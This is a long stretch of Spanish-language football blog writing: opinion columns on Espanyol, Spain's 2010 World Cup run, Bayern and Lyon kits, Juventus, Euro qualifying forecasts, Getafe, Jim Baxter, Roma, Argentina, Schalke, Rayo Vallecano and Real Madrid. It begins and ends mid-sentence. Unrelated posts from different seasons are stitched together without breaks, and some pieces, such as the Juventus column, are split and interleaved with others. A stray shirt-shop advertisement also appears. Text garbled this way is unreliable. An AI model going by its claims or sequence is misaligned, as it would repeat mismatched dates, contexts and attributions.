abundancia durante cuatro temporadas. Unas veces el fútbol iba a la escuadra y otras  a la espinilla del rival. Hablamos de aquel Espanyol que viajaba hacia los ochenta empujado por la clase nítida de Rafael Marañón. Se le recuerda también por paraguayo, claro. Como a Benítez, Cayetano Ré, el Gato Fernández, Ortiz Aquino, Osorio… Como a aquel Giménez que junto a Murua y el propio Marañón formaba la delantera ‘Metro Golden Mayer’. Sí, la BBC es basura.Me dice Marañón hijo que su equipo siempre ha sido muy de paraguayos, que habría que bautizarles rollo los ‘zaraguayos’. Convenimos que lo que mola son los ‘Periguayos’. Ayfuch nos habría dado un guantazo.Foto: Mundo Deportivo Hay momentos en los que sólo puedo recurrir a lo bruto para expresar lo que siento. Esos momentos suelen estar relacionados con el fútbol. Por ejemplo, anoche mientras cruzaba Madrid de norte a sur, de Vallecas a Tetuán, tras disfrutar con los noventa minutos que nos tienen viviendo ya en la final de la Copa del Mundo me dio por pensar, tal era la saturación de camisetas y gritos, que el metro era una aorta palpitante de hemoglobina fresca. Cada vez que el vagón abría las puertas parte de esa sangre salpicaba a la gente en los andenes sólo para que pudieran relamerse. Que esa aorta desparramará su contenido el próximo domingo en Johannesburgo. Que esa aorta bulle con el aceite que hace que todo este invento funcione. Cuando Puyol se elevó por encima de lo que hiciese falta para martillear aquel balón a la red me lo imaginé como el más poderoso de una horda de fanáticos de la banda de heavy metal universal, como un headbanger salvaje y definitivo, melena y movimiento de cuello incluidos imprimiendo electricidad al cabezazo final. Cuando llegué a casa y me calmé, y aquí reconozco que el cerebro me hace regates inesperados, recordé inmediatamente el voceo gutural de Juan Gómez, de Juanito, empujando a base de decibelios cada vez que Martín Vázquez tocaba la pelota en aquellos partidos que palmábamos invariablemente. ¡Vamos Rafa, eso es medio gol! Sangre, martillazos y gritos, la España bruta que me tiene enloquecido. La Champions League ha querido cruzar al Bayern de Múnich y al Olympique de Lyon, dos conjuntos aparentemente aseados en el vestir.Aparentemente. Verán, aprovechando la ocasión y comenzando por los alemanes, les pido que hagan un ejercicio de  abstracción. Imagínense, por un instante, que no han visto ni un partido  del conjunto bávaro durante las últimas temporadas. Ni una mísera  fotografía en al Marca. ¿Listos? . Bien, ahora contéstenme con franqueza a la siguiente pregunta. ¿De que maldito color van a ir vestidos los jugadores del club  muniqués hoy? No se esfuercen, el acertijo es imposible de descifrar. Allí, en la sede del Hollywood FC siempre han tenido una querencia inusitada por  exprimir las posibilidades de la paleta cromática a la hora de confeccionar su vestimenta. De rojo plano, de rojo oscuro rayando el granate, a rayas  horizontales, a rayas verticales, de negro, de negro y rojo, de amarillo  y verde, de azulgrana, a rayas azulgranas, de blanco. Así las gastan en  Munich. Siempre diferentes, siempre adidas, casi siempre  horribles.Ejemplo de ello es la elástica que ilustra el texto, la que el equipo utilizó como suplente en la temporada 1998. ¿Tienen escalofríos? . Pues imagínensela con un Carsten Janker sudoroso  en su interior. En primer lugar está el asunto de las rayas, peliaguda cuestión  cuando se trata de diseñar una camiseta con un mínimo de dignidad. Alguien debería colgar un cuadro en ese cuartucho donde los artistas de  la aguja y el patrón de Adidas innovan, que advierta. Es fútbol,  nada de rayas horizontales, beste dank. Las rayas horizontales  son para el rugby. Luego está el aspecto general del engendro que yo  definiría en dos palabras, Rivers Cuomo. Y es que, señores de Adidas,  las camisetas de fútbol son para jugar el fútbol, no para ir olisqueando la falda de alguna  indie despitada en Benicassim.El rival del Bayern hoy por un lugar en la final de Champions es el Olympique de Lyon, que ha vestido tradicionalmente una camiseta blanca con breves motivos azulgranas. Muy elegante. Entonces, ¿A que  carajo vino transformar al equipo en un escuadrón Gusiluz cuando tocó usar la camiseta de recambio en la temporada 08-09? No lo entiendo. Aun estoy esperando a que Umbro ofrezca una versión plausible del desaguisado. Que informe acerca de que la zamarra incorpora en realidad la últimísima tecnología para provocar una epilepsia irreversible en el  rival, a lo anime loco, creando la ventaja inigualable que te lleve por ejemplo a ganar el camepeonato local por sistema . O que tiraron masivamente de Stabilo para colársela a Jen Marie Aulas. Pero que reconozcan su culpa. Amarillo eléctrico. Así se conoce en el mundillo de la moda deportiva el color aunque yo lo rebautizaría sin dudarlo  como Amarillo nuclear. De hecho si hubiese la más remota posibilidad de  que en Chernobyl volviese a germinar la vida humana y con ella el  fútbol, el Zone FC, FC Atom o como se  diese en llamar el club local, debería vestir como el Lyon en sus partidos de  visitante. Por cierto y por ir rematando la madeja de tonterías, cada vez que veo la fotografía, me acuerdo de un episodio de Los Simpson. Era  aquel en el que Homer creía ver a un extraterrestre fluorescente cuando en realidad era Montgomery Burns deambulando  drogado en mitad de   la noche, despidiendo a raudales toda la radiactividad acumulada durante   años y murmurando deseos de amor para todo el vecindario. Cambien al   viejo empresario por un francés rapado a las cinco de la mañana y   encontrarán la verdadera utilidad de esta prenda. La Juventus ha vuelto a agarrar el liderato en soltario de la Serie A cinco años después. No aparecer por el puntero desde el 14 de mayo de 2006 ha sido un parto largo y desgarradoramente doloroso para la parroquia blanquinegra, más habituada a besar laureles que a masticar barro. Que se lo imaginen por un momento la culerada y merengada que leen habitualmente este blog y luego me cuenten…La Vieja Dama, como el Barcelona y el Real Madrid, es demasiado señorial como para revolcarse en barro durante demasiado tiempo y tarde o temprano iba a, tenía que, volver.De repente, van a ganar la Premier League. No debe ser fácil. De hecho, coincido en que es una gesta. La comparé a mis amigos con aquella liga del Blackburn Rovers pero me dijeron que esto era otra cosa. El juego de Ranieri, su entrenador, es el mismo desde hace años: apretar el culo y mandar balones a los de arriba. Si los delanteros son buenos, se marcarán goles. Si los de atrás hacen su trabajo, no se encajarán goles. La victoria es equilibrio y el Leicester es un funámbulo sobre el césped.Para mí, la gran gesta del fútbol moderno es la victoria de Grecia en la Eurocopa del 2004. Cuando los helenos ganaron ese torneo, no había Twitter. En El País, Iván Castelló escribía que “los griegos, los obreros de la Eurocopa, representantes en el siglo XXI de un fútbol arcaico aunque fueran la cuna de la civilización moderna, se llevaron para Atenas el título que perdieron 15 selecciones, incluida España”. Es decir. No ganaron ellos, perdimos los demás.En cualquier caso, da gusto ver de nuevo a una generación competitiva en Hungría, y no es nada descartable que veamos a los Szalai, Dzusdzsak o Gera en Brasil. Ojalá.Pronóstico: Holanda y Suecia.Grupo F: Un grupo que ya está completamente decidido, al menos en lo que respecta a los dos primeros puestos, que se jugarán entre Croacia y Grecia en el partido que los enfrenta a ambos en el Karaiskakis, y en menor medida en la última jornada ante Lituania y Georgia. Sorprende el rendimiento que ha conseguido Fernando Santos –todo un clásico- en la gestión de la herencia Rehhagel. En Croacia, a su vez, está entrando gente joven y competitiva como Lovren o Kalinic, pero el esqueleto es el mismo que rozó la gloria en 2008 y fracasó miserablemente dos años más tarde, defraudando muchas expectativas. Habrá que ver en particular el rendimiento de Modric, que no acaba de confirmarse como la estrella que parece que puede ser. Hay que destacar también el papel de Israel, trece puntos y sensación de crecimiento, con Benayoun llevando los mandos y futbolistas emergentes como el bermellón Hemed.Pronóstico-certeza: Croacia y Grecia.Grupo G. Si bien le cayeron palos por todas partes tras la eliminación en Sudáfrica –más por el juego global que por el partido ante Alemania- la Inglaterra que está renovando Capello se ha mostrado solvente en esta fase de clasificación. Un punto le separa del liderato matemático, y en caso de no conseguirlo sería extraño que no entrase como el mejor segundo. Además, Fabio está metiendo gente en principio alejada de su ideario clásico, tipo Downing, Milner, Ashley Young o Adam Johnson, tipos con clase, jóvenes, más técnicos que poderosos. Montenegro, por su parte, bastante tendrá con clasificarse, pues la pujante Suiza de Shaqiri está a tres puntos y la última jornada les espera el temido viaje a Basilea. Si el equipo de Branko Brnovic no puntúa frente a los pross la próxima jornada, el enfrentamiento en St. Jakob’s Park puede ser perfectamente el gran partido del último día. Y no están bien los balcánicos, un punto en los últimos dos partidos, aunque no hay que olvidar hasta qué punto sería una heroicidad para un país tan pequeño.Pronóstico: Inglaterra y Suiza.Grupo H. A priori el grupo más reñido de todos, tres equipos en 13 puntos, aunque cierto es que a Noruega sólo le queda un partido y a Portugal y Dinamarca dos. Los lusos lo tienen casi hecho, por cuanto que su próxima cita es en casa ante la débil Islandia, pero Noruega también lo tiene relativamente fácil ante Chipre en casa, y Dinamarca y Portugal juegan entre ellos la última jornada. De todos modos, ambas selecciones nórdicas andan en horas bajas, y se hace difícil pensar que un equipo cuya máxima estrella pasa por ser Niklas Bendtner –aunque Eriksen llega pujando fuerte en el Ajax- y otro donde el eterno Riise sigue siendo el líder indiscutible, puedan lograr algo relevante en la Eurocopa. Otra cosa es Portugal, de quien siempre esperamos lo mejor, aunque el conflicto de Pepe y Carvalho no hable precisamente de buen ambiente en el seno del equipo.Pronóstico: Portugal y Noruega.Grupo I. Y por fin llegamos, para terminar, al campeón. Envueltos como siempre en debates –en este caso más o menos amables- tipo Torres, el doble pivote o la presencia de Cesc y Silva en el once inicial, tomamos como el orden natural de las cosas que España haya ganado todos los  partidos y le esperen dos paseos ante Chequia y Escocia. Pues no, es un hito y como tal hay que destacarlo. La Roja decidirá también su acompañante a defender el título, aunque quien peor lo tienen son los británicos, que deben rendir visita al estadio Rico Pérez, están a dos puntos de los checos y perdida la diferencia de goles con ellos.Hoy se ha limpiado la falda y ha vuelto. Reluciente resucitada el quinto año.La gracia del tema es que la bicha rediviva se parece a la antigua tan solo en las pintas. Los mismo faldones sí pero habitados por una bestia distinta. Lo leo en la Gazzetta y es significativo, a la cita del pasado martes contra la Fiorentina asistieron once futbolistas reclutados después de 2010. El portero Storari, Bonucci, Barzagli, Lichtsteiner, Vidal, Pirlo, Vucinic, Pazienza, Estugarribia, Pepe, y Matri. Caso espectacular también y para estudiarlo con más detenimiento en otro momento es el de Alessandro Matri. Cromo arquetípico del bomber de provincias, está cabalgando su mejor ola (13 dianas en 23 titularidades) justo cuando ha vestido la casaca bianconera. Renovando el club y escribiendo páginas para el futuro al mismo tiempo. Leyendo un poco sobre Alejandro Sabella descubres de que no prueba gota de alcohol y tampoco le tira el picante. “No recuerdo haber probado ninguna cosa muy diferente. Voy a lo seguro” Se lo explicaba el propio Sabella a Pablo Hacker y Javier Saúl en el libro que se publico hace unos meses sobre el míster en Argentina. Al Pachorra le gusta la siesta y agarró su primer banquillo como entrenador jefe a la tierna edad de 55 años. Indiana Jones en chándal, los libros de ‘Elige tu propia aventura’ en llamas. Pero si rascas un poco más entiendes que no tiene miedo al cambio. Te lo encuentras aprendiendo a pegarle de zurda en algún colegio de Barrio Norte, en la zona más acomodada de Buenos Aires. “Creo que yo era derecho y como jugaba de diez y casi todos los diez eran zurdos, empecé a patear de zurda todos los días y quedé zurdo” Sigues tirando del hilo y ves un flequillo exuberante animándose a emigrar para pasear clase en el tosco fútbol inglés de los ochenta. Lo seguro en Sabella, el 5-3-2 bien arropadito en defensa, murió anoche. Por el bien de Argentina y Messi esperamos que los próximos partidos sean de pelazo y zurda.Entonces, hubo un funeral y esperamos que una resurrección gracias a la buena cintura de Sabella. Con Higuaín por delante y Gago por detrás, Messi recordó que sigue siendo letal entre vómitos, juzgados y lesiones. Anticipó el crecimiento que puede sufrir su juego en los próximos partidos y envió unos cuantos memes a la papelera de reciclaje. Bosnia no es el equipo más aplicado del mundo en defensa, no tuvo que costar tanto, pero la tímida soltura de Argentina tras el cambio nos despertó a todos de la primera sesión golfa con aroma a fiasco del Mundial. Gago libera a Messi del penúltimo pase y le acerca al área mientras que Higuaín le allana el camino al gol porque se entienden de memoria. Se vio nítido en el golazo de la Pulga. Si sigues contando, es obligación, con Di María en la idea, las cuentas te van a acabar saliendo.En su primera rueda de prensa como seleccionador el ordenado Sabella citó a Manuel Belgrano, el patriota argentino que murió en la indigencia pese a haber creado la bandera y defendido la nación en los peores momentos, para pedirle a cada miembro de la albiceleste que se pusiera al servicio del bien común. Anoche, sin tanta pompa,  se aplicó el cuento y le regaló a los argentinos la primera sonrisa. El primero de los puestos con derecho a premio, espero sepan disculparme los aficionados que volvieron a casa con el jugoso regalo de la salvación bajo el brazo, se posó en el sur de Madrid. En Getafe. Concretamente gracias al mejor enquipo de su historia, cifras cantan, con el mérito añadido de que se ha conseguido el hito merced a una propuesta futbolística más que potable. De la mano de un Míchel que supo revertir el agónico escenario del curso pasado (cuando el Geta se vio abocado a rebañar su permanencia en el último suspiro) y de paso su propio prestigio como preparador, el equipo azulón ha conseguido asomarse a Europa (dos temporadas después de su bautismo) y a semifinales de Copa para consolidar definitivamente el proyecto iniciado hace seis años por Ángel Torres. Y el Getafe es, recordemos, una entidad con apenas 27 años de vida que guerrea en Primera alimentados por uno de los presupuestos más ajustados de la categoría.El Getafe es lo que siempre hemos conocido como un equipo apañado. Sin embargo, imagino que su presidente tiene mucho que ver en ésto, demuestra una habilidad especial para contratar a los futbolistas adecuados. A la base del curso pasado se sumaron el guardameta Jordi Codina y los cetrocampistas Pedro Ríos, Boateng, Dani Parejo, Pedro León y Nacho. De los cuatro sólo Codina ha ofrecido un rendimiento irregular, alternando buenas paradas con actuaciones discretas, pero el resto han sido buenos negocios. Mención especial para la espectacular campaña de Derek Boateng y de Pedro León. El ghanes, pescado en Colonia en silencio, ha sido un espectáculo de fuerza y toque en la medular. El mejor jugador del año en Getafe. Por su parte, el mediapunta murciano, fino, regateador y preciosista, ha comenzado a mostrar toda la clase que lleva dentro.De los que estaban destacó Roberto Soldado, el gudari. El delantero con más talento que haya salido de la cantera blanca en los últimos años mandó la pelotita a la red en veinte ocasiones, ahí es nada, traduciendo en frutos la aseada propuesta futbolística que Míchel se ha empeñado en implantar en el Coliseo. Seguramente se lo llevará el Valencia. No quiero olvidarme tampoco de los excelentes escuderos que fueron Manu del Moral y (al menos en el tramo final de campeonato) el injustamente discutido Adrián González. ¿En el debe? Suena exigente pero, sobre todo para los que vemos al equipo desde la distancia, la temporada se ha cerrado con el regusto amargo de que se podía haber rascado algo más (se me viene a la mente Albín) y que el Geta ha jugado algún que otro partido con el freno de mano puesto. La sensación es la de que, con un par de refuerzos, los de Ángel Torres deberían pelear por jugar en Champions.Lo mejor: el buen fútbol, combinativo, con ideas, desplegado bajo las órdenes de Míchel. La irrupción de Derek Boateng.Lo peor: el rendimiento de algún futbolista (Albín o Codina). El linchamiento injusto al hijísimo Adrián González. La sensación de que este equipo, más enchufado y con un par de retoques, podría haber dado más guerra aun. En un pub de Glasgow un grupo de oficinistas jóvenes, cinco de esos pipiolos que desayunaban Clearasil antes de ayer y el traje les sienta como a un cristo dos pistolas, se parten de risa mientras señalan al viejo harapiento que trasiega pintas al fondo de la barra. Y hay que reconocer que la escena no sería tan extraña si el buen hombre no tuviera por costumbre bajar al bar en pijama. El caso es que los chicos cacarean y el anciano ni se inmuta. Al contrario, ajeno a las burlas y a su propia circunstancia se aprieta un vaso tras otro siempre con la cabeza bien alta. Pueden reir lo que quieran. No piensa así el dueño del garito, un orate bigotudo con tan mala leche como pueda tener el responsable de cualquier negocio hostelero. Entre las cuatro voces que ponen firme a la chavalada hay una que no deja lugar a la réplica.“El tipo del que os estáis descojonando es Jim Baxter, el mejor jugador escocés de la historia”Así debieron transcurrir, más o menos literatura, los últimos días en vida de Jim Baxter: leyenda del Rangers y de la selección escocesa desde que dejara su sello en la superficie del fútbol británico durante los fecundos sesenta. No en vano el tipo era un alcohólico recalcitrante ya desde su etapa como futbolista. Tanto que durante uno de sus intentos de rehabilitación decidió abrir su propio pub. Imaginen la estampa. Baxter era también, imagino que va en el sueldo del profesional, un mujeriego empedernido. “Cuando llegué a Glasgow las chicas se me tiraban. Realmente era un gran cambio y no iba a desaprovecharlo”Claro que Jim Baxter, por eso hablamos hoy de él, era igual de exhibicionista sobre el rectángulo verde. Fino es poco, ese hombre flotaba sobre el terreno. Sus carreras parecían un paseo con la ropa del domingo y con su zurda prodigiosa repartía unos regalos que llegaban a la bota del compañero tan solo para acariciarla. Resulta sencillo imaginar el impacto de Baxter en el fútbol escocés si consideramos que solo jugo cinco temporadas al máximo nivel en el Rangers. Del 60 al 65 para pescar apenas tres ligas y una copa de Escocia. No necesitó más para colarse en la mente de todos para siempre.Luego estaba su otra faceta. La de histrión. Con la misma sangre corriendo por sus venas que otros ilustres entretenedores como Len Shackleton o Antonio Cassano, el flaco Baxter era un prodigio de aliños. El adorno y la provocación eran su marca. Todavía se recuerda en toda Inglaterra cuando en 1967, durante la sonada victoria escocesa en Wembley frente a la Inglaterra campeona del mundo, se dedico a subir la banda golpeando la pelotita con la bota izquierda sin dejarla caer en ningún momento. ¿Recuerdan la monería de Richard Witschge en un Ajax-Feyenoord? Pues lo mismo en el templo del fútbol y ante defensores británicos. Ganador nato, se embolsó 16 derbis contra el Celtic, Jim Baxter se sabía el mejor y cuando agarraba la pelota quería que se enterase hasta la última persona en el estadio.Pero al igual que muchos en esa legión de talentos británicos y mostrencos, Baxter tenía una querencia por la botella que terminó por llevarle a la tumba. Una inversamente proporcional a su afición por entrenarse en condiciones. Como George Best, el flaco tenía el mismo talento natural para jugar al fútbol que para desatender cualquier asunto serio que tuviese entre manos. Quizá por ello se cortó la coleta prematuramente, a los 31, tras varios años de rendimiento opaco en la liga inglesa (Sunderland y Nottingham Forest) y un breve e infructuoso retorno a su club de siempre. El tipo, arrogante como pocos, alardeaba de tener mejor hígado que Best cuando entró por primera vez al quirófano pero a la segunda no sobrevivió y murió en 2001 noqueado por un cáncer de páncreas. Entre medias la leyenda se paseaba en pijama, orgulloso, por algún pub de Glasgow. Camino por ese corredor que huele como a cerrado y tras esquivar a una enfermera que está a punto de derramar un vasito con pastillas por el mármol gastado miro al fondo del salón central y le veo junto a la ventana.Embutido en la misma chivata roja y elástica que hasta cuando era joven se empeñaba en denunciar unos michelines rebeldes, el viejo está sentado arruga frente al sol y enreda con el balón que le regalé el mes pasado. Lo rueda contra la pared. No se le ha olvidado el modo pero apenas si acierta a dar cuatro pases seguidos. El viejo gastado vestido de la Roma es la Roma misma, el equipo más anciano de la Serie A.La media de edad en la Roma es de 29 años y pico. Ese Humbert Humbert del fútbol mundial que atiende por Arsene Wenger lloraría al comprobar que 16 de los 27 jugadores que han puesto en liza primero Claudio Rainieri y ahora Vincenzo Montella lucían más de 30 primaveras en el carnet de identidad. El empate de la pasada jornada contra el Parma lo firmaron nueve treintañeros. ¿El resultado palpable? 24 goles de los 38 encajados por el conjunto capitalino han sucedido en los últimos 30 minutos de partido. La crisis aconsejó mirar el mercado para no tocarlo demasiado y dejó al viejo equipo atrapado en resina. Ahora a la Roma le falta aire en el sprint y eso le ha costado la friolera de 16 puntos.Es cierto que Montella, si se descuida está para animarse con el aeroplano, está recosiendo el equipo tirando de él hacia arriba (dos victorias y un empate desde que rubricó) y recuperando tanto las buenas sensaciones como alguna pieza que antaño funcionaba como Pizarro. Aun así la duda viajará junto al resto de la expedición a Ucrania. También embarcarán Francesco Totti y el 4-2-3-1 con el que se los giallorossi se encuentran cómodos en el rectángulo para intentar la machada. Será contra el resultado (2-3 y gracias en el encuentro de ida) y contra el reloj. La cosa, para que negarlo, está complicada.Enfrente un equipo ordenado, técnico y rápido. Pero sobre todo hambriento. ¿Pero estos rusos no bajan mucho el pistón tras el parón en su liga? Que se lo hubieran preguntado a Rainieri tras ser barrido a escobazos de su propia casa por un conjunto que arrancaba tras dos meses de ayuno competitivo. Consulten a los que se han ido con las manos vacías de Casa Lucescu que son precisamente esos, todos los que la han visitado. El Shakhtar sigue virgen en el umbral de octavos pero la victoria que se echaron a la mochila en el Olímpico les pone en la rampa de lanzamiento para estrenarse. También su fortaleza en casa. Teniendo en cuenta que la Roma deberá salir a pasear por campo rival más de lo transalpinamente aconsejable para optar a premio yo digo que el tapado puede hacer historia esta noche. Esperaba que el Roma-Juventus en cuartos de la Copa de Italia se apareciese como un síntoma. Un quejido o una carcajada de los romanos, tanto daba. Han caminado tranquilos después del bofetón de hace quince días pero quería comprobar, en el cara a cara, si seguían con ánimo y fútbol en el cuerpo para pelear la liga ante el que todos dan por campeón. Ganó la Roma, están en semifinales de Copa, pero no se deben sacar demasiadas conclusiones porque Antonio Conte se empeñó en alterar el escenario cuajando su equipo de suplentes y eternizándose en la toma de decisiones. En la Juve B jugaron de inicio Storari, Isla, Peluso, Marchisio, Giovinco y Quagliarella. Seis tipos que colocados sobre el césped solo sirvieron para dibujar un mosaico con un mensaje nítido de Conte: la Copa me importa un pepino. Para más inri cuando el míster introdujo a Fernando Llorente y a Tévez, la mandanga buena, ya estaba todo el pescado vendido. Ganó la Roma con gol de Gervinho y exhibición de Pjanic, pero hasta las palabras serenas de Totti al término del encuentro nos animan a pensar que incluso los romanistas, sin decirlo, entienden que el partido hubiera sido otra cosa con los cromos que cuentan sobre el campo.Sin embargo, esto no debe empeñar el mérito de Rudi García, valiente intuitivo con los cambios una vez más, ni de la secretaría técnica de la Roma que tiene a casi todos fichajes de verano (excluyo a Ljajic) y a uno de invierno rindiendo al máximo nivel en un balance prácticamente irrepetible. Un equipo nuevo ha despachado el mejor arranque de la hisoria romanista y pelea por el doblete jugando de maravilla. Pjanic volvió a dar una lección de técnica en el centro del campo y descerrajó el partido en cuanto entró a concurso en la segunda parte. La jugada del gol llega tras un contragolpe académico nacido porque él quiso, Strootman y Maicon fueron puro empuje y Benatia el muro de siempre. Mención especial merece Nainggolan, enchufadísimo desde que ha llegado a la capital, y ya importante tanto en tareas de contención (lo sufrió Pirlo) como en la distribución. Tremendo y enésimo acierto de este equipo con el belga.Decisiones arbitrales aparte, la Roma consumó su venganza sometiendo a la Juventus durante la mayor parte del partido pese a su proverbial atasco anotador (algo para la que no se prevé mejoría salvo que Destro comience a jugar regularmente o se fiche un buen nueve) pero los síntomas son contradictorios. Habrá que esperar acontecimientos en liga, si aguantan el tirón y ver como llegan al penúltimo envite el próximo 11 de mayo, contra la Juve de nuevo en el Olímpico. Foto: Juventus La lotería es religión en Nápoles. Tal es la fiebre por este juego que los napolitanos tienen su propio diccionario de claves para interpretar los sueños y traducirlos en números que les saquen de pobres. Según la ‘smorfia’, de Morfeo, si sueñas que un oso invade tu cama con oscuras intenciones deberás jugártela al 89 y si se te aparece un borracho cantando alegremente bajo el balcón lo mejor que puedes hacer el día siguiente es rajar el colchón y morir por el 14. Dries Mertens juega con el 14 a la espalda. El extremo alegre que ha bordado el fútbol en el Nápoles se echó unos gorgoritos rápidos por la derecha para amenizar el estreno de Bélgica, la hypeada. Ni Aurelio de Laurentiis, que ha perdido el suficiente dinero apostando en el cine, ni Marc Wilmots, que se atrevió a nadar durante dos años en el movedizo panorama político belga, se jugarían un euro a la ‘smorfia’ pero apostarían toda su fortuna por Mertens.Como el fútbol despachado ayer en Brasil por la aristocracia del balón ha dejado la noche para la anécdota random, voy con lo de Ezio Capuano.Surrealista es poco.Puedes encontrar camisetas de Irán, Home y Away, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Por si te surge la ocasión de cambiársela a Messi… Corría el pasado mes de septiembre y Jens Keller contaba los hilillos de la soga que aún le mantenía a duras penas aferrado al Schalke 04, mientras se debatía entre seguir luchando o resignarse y dejarse arrastrar por la fuerza de la corriente. Se habían disputado las siete primeras jornadas de la Bundesliga, el Null Vier penaba por la zona media baja de la tabla: apenas había conseguido arañar ocho puntos de los primeros veintiuno en juego, y la imagen del equipo, con dieciséis goles encajados, dejaba mucho que desear.A Jens Keller, segunda temporada al frente del banquillo del cuadro de Gelsenkirchen, siempre le ha perseguido cierta fama de entrenador gris. El día que fue presentado como principal responsable técnico del Stuttgart, su primer club como entrenador, Keller acudió al acto de presentación acompañado de Fredi Bobic luciendo un indescriptible jersey que parecía sacado del armario de su abuelo. No parecía la mejor carta de presentación para un entrenador interino, promocionado directamente del equipo juvenil como medida de emergencia. Tampoco su trayectoria en el Mercedes-Benz Arena dijo algo muy diferente de lo que apuntaba aquella horripilante prenda de vestir. Tras unos meses en el cargo, fue fulminantemente destituido ante el grave peligro de descender de categoría.Semejante historial no resultaba excesivamente alentador ni ilusionante cuando, un buen día del mes de diciembre de 2012, Jens Keller fue llamado a filas y promocionado desde el cadete del Schalke para sustituir a Huub Stevens al frente del banquillo del primer equipo Königsblau. Aquel día Keller dejó el inefable jersey de Stuttgart en casa, quién sabe si en un intento desesperado de lavar su deteriorada imagen. Pero aquella prenda estaba en la memoria de todos los aficionados del Schalke, como un inevitable recordatorio de su oscuro y desilusionante pasado reciente. Keller era un entrenador sin crédito, sin una trayectoria que lo avalase. Una figura carente de carisma, sin una capacidad de liderazgo demostrada… justo lo contrario que el respetadísimo Stevens. No puede decirse que Keller fuese un técnico deseado.En consecuencia de aquella irrupción inesperada, los primeros meses del nuevo técnico en el Veltins fueron complicados. El Schalke, a imagen y semejanza de su técnico, aparecía como un equipo gris, plano, sin espíritu ni carisma, pero que a pesar de un arranque muy titubeante consiguió entrar en Liga de Campeones, mérito más que suficiente para que Keller viese su contrato renovado pese a no haber terminado de calar nunca entre la afición de Gelsenkirchen.No es complicado percibir que el Null Vier se encuentra en una fase de transición, con una plantilla aún por terminar de conformar y un técnico que no parece el ideal para empujar al equipo a dar un nuevo paso adelante. Todo podría alargarse más aún si, como parece, Julian Draxler abandona el equipo el próximo verano y toca buscar un nuevo punto de apoyo sobre el que equilibrar un proyecto que, a día de hoy, no pasa de ser un simple boceto y, sobre todo, una absoluta incógnita que ha tenido, además, la mala fortuna de verse emparejado con el Real Madrid en los octavos de final de la Liga de Campeones. Paco Jémez acumula ya tres temporadas salvando al Rayo Vallecano. Y digo ‘salvando’ porque no puede afirmarse que el objetivo de la Franja sea otro que el de evitar el descenso de categoría. No ha demostrado en estos tres últimos ejercicios hechuras ni fundamentos como para considerar que sus pretensiones deban ser más ambiciosas. Habrá quien diga que con la diáspora anual de cada verano es complicado cimentar y que la imposibilidad de incrementar la enjundia de los objetivos radica precisamente en esa necesidad de reinventarse y de sobreponerse al vacío a la que se ha visto sometido el técnico canario desde su llegada a Vallecas. No deben ocultarse sus méritos. Tras haber contribuido a que el Rayo complete la trayectoria ininterrumpida en Primera más larga de su historia, Jémez se encuentra en una posición complicada de discutir y maneja unos argumentos difíciles de rebatir.Sin embargo, los errores se repiten con desesperante reiteración. El Rayo de Paco siempre descarrila, año tras año, en las mismas curvas. Empeñado en mostrarse fiel al personaje que la prensa ha dibujado inspirándose en su figura, el técnico rayista mantiene una preocupante y cada vez más ridícula tendencia a la caricaturización de su imagen. Magnificando los rasgos más distintivos de su estilo hasta lo absurdo, Paco hace ver que si sigue tropezando en las mismas piedras de siempre es porque realmente quiere seguir tropezándose en ellas. Sabe lo que hace y es consciente de sus consecuencias más previsibles pero, a pesar de ello, no tiene interés alguno en cambiar o matizar su discurso y su propuesta. Y precisamente por eso, el Rayo no crece.Siempre he interpretado que Vallecas es para el tren de Paco algo así como un apeadero de provincias, una simple estación de paso en la que parar a estirar las piernas y dejarse ver por el resto del pasaje. Sus miras, y que me disculpe la afición de la Franja, son más ambiciosas. Dirige al equipo pensando en lo que está por venir. Tal vez por ese motivo se empeña en vestir al modesto Rayo con un alta costura poco apropiado para acodarse en la barra del bar de barrio y pedirse un tercio con una de bravas. Como si quisiera demostrar que es un entrenador válido para cualquier empresa de la más alta enjundia. Los años pasan y ya van cuatro temporadas en Vallecas. Los años pasan y Paco sigue siendo un personaje abonado al histrión y completamente ajeno al término medio. Una anécdota permanente en rueda de prensa. Una montaña rusa emocional extremadamente agotadora para el abnegado seguidor rayista. El Rayo atrevido y valiente de Paco es un Rayo insensato y estancado. Al Barça le han dejado plantado en el Olímpico de Berlín. La final que muchos aficionados españoles soñaban tendrá que seguir siendo, para alivio de otros tantos, simplemente un sueño. Porque el Real Madrid culminó anoche, a la espera de la cantada resolución del campeonato liguero, una temporada cimentada sobre conceptos futbolísticos demasiado etéreos y confiada al peso específico de una plantilla carísima pero alarmantemente desequilibrada. Cayó ante una Juventus que se limitó a hacer lo que ha hecho durante toda su historia: cosechar éxitos a base de exponer muy poco. No es el momento de ahondar en la herida y repasar el historial de tropelías cometidas por la política deportiva blanca (futbolistas jugando fuera de posición, otros haciéndolo por mandato divino, defensas que no defienden, delanteros con alergia al área rival…), pero digamos que quien más quien menos tiene una explicación plausible para un nuevo año en blanco. Un razonamiento masticado desde meses atrás.De entrada, el Madrid planteó el partido de anoche como debía de hacerlo. Saltó al césped tratando de aislarse del espíritu incendiario y catártico que emanaba de la plaza de los Sagrados Corazones. No necesitaba, ni mucho menos, una proeza. No era condición poner el partido al rojo vivo, como parecía demandar cierto sector del graderío, cuando no era necesario. Controlando en todo momento las pulsaciones y conjugando intensidad con tranquilidad, los de Ancelotti supieron gestionar unos minutos iniciales confiados en que la imposición de la lógica de que el gol que les diera el pase momentáneo a la final acabaría llegando. Con un hiperactivo Marcelo como sorprendente piedra angular del juego ofensivo, el Madrid articulaba llegadas sobre la portería de Buffon apoyándose en un Benzema cuya principal virtud es no dejar nunca claro en qué posición está jugando. El francés, que está por encima de cualquier estadística absurda, tiene la habilidad de acudir siempre a la parcela en la que se requiere de sus servicios, de personarse allí donde su capacidad asociativa da nuevo aire al juego de su equipo. Y de hacerlo todo, además, con un generoso sentido de la estética y el arte. De su intervencionismo en el fútbol blanco se aprovechó el Madrid para desatar la tormenta que dio origen al torpe penalti de Chiellini, que no es precisamente el recluta patoso, sobre James.El resultado daba entonces la razón a la tranquilidad blanca y hacía comprender a la grada que su señal de ira y fuego no se ajustaba a las necesidades del choque. Fue entonces cuando la Juve fue más Juve que nunca. Aún sabiendo que el resultado les dejaba fuera de Berlín, jamás llegó a descomponerse y perder la fe en sus convicciones. Los de Allegri convirtieron la eliminatoria en un juego en el que el ganador acabaría decidiéndose a los puntos y por detalles. Justo lo que no quería el Madrid. Preso de un absurdo nerviosismo y atenazado por unas piernas que cada vez pesaban más, el cuadro local comenzó a ceder terreno hasta que se vio, de pronto, desposeído del balón.Un ejemplo de la decadencia del fútbol escocés, aunque resulte paradójico que puedan formar un centro del campo muy 